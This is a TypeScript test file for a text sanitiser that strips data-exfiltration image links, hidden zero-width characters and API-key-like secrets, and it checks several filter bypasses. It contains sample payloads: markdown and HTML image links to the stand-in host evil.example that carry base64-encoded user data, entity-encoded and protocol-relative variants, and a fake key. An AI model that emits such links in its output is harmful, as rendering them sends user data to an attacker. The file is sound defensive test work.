import { test } from "node:test";
import assert from "node:assert/strict";
import { plug } from "../lib/plug.ts";

test("blocks exfil links, hidden text and secrets; allows listed hosts and plain links", () => {
  const bad = "![x](https://evil.example/p.png?d=ZGFuYS5yZXllc0Bub3J0aHdpbmQuZXhhbXBsZQ==) hi​ there key sk-ant-api03-Zk3vQ9xT2mLp8RwYc5HnJd7A";
  const r = plug(bad);
  assert.deepEqual(r.findings.map((f) => f.type).sort(), ["HIDDEN_TEXT", "SECRET", "URL"]);
  assert.ok(!r.text.includes("evil.example/p.png") && !r.text.includes("sk-ant") && !r.text.includes("​"));
  const ok = "See https://docs.example.com/guide?page=2 and ![x](https://cdn.example.com/a.png?token=abcdefghijklmnopqrstuvwxyz)";
  assert.equal(plug(ok, ["cdn.example.com"]).findings.length, 0);
});

test("closes bypasses: case, protocol-relative, hostname data, plain images, trailing dot", () => {
  const blocked = (t: string, allow: string[] = []) => plug(t, allow).findings.some((f) => f.type === "URL");
  assert.ok(blocked("HTTPS://evil.example/x?d=ZGFuYS5yZXllc0Bub3J0aHdpbmQ="));
  assert.ok(blocked("![](//evil.example/x?d=ZGFuYS5yZXllc0Bub3J0aHdpbmQ=)"));
  assert.ok(blocked("https://ZGFuYS5yZXllc0Bub3J0aHdpbmQ.evil.example/"));
  assert.ok(blocked("![](https://evil.example/logo.png)")); // image, no data in URL
  assert.ok(blocked("https://evil.example/#ZGFuYS5yZXllc0Bub3J0aHdpbmQ="));
  assert.ok(!blocked("![](https://cdn.example.com./a.png)", ["cdn.example.com"])); // trailing dot normalised
  assert.ok(!blocked("see https://docs.example.com/guide for details")); // plain link still fine
});

test("closes parser differentials: entities, <angle> destinations, spaced img src, reference images", () => {
  const blocked = (t: string) => plug(t).findings.some((f) => f.type === "URL");
  assert.ok(blocked("&#104;ttps://evil.example/x?d=ZGFuYS5yZXllc0Bub3J0aHdpbmQ="));
  assert.ok(blocked("https&colon;&sol;&sol;evil.example/x?d=ZGFuYS5yZXllc0Bub3J0aHdpbmQ="));
  assert.ok(blocked("![](<https://evil.example/logo.png>)"));
  assert.ok(blocked('<img src = "https://evil.example/logo.png">'));
  assert.ok(blocked("![pic][1]\n\n[1]: https://evil.example/logo.png"));
  assert.ok(!blocked("Tom &amp; Jerry see https://docs.example.com/guide")); // ordinary entities don't trip it
});
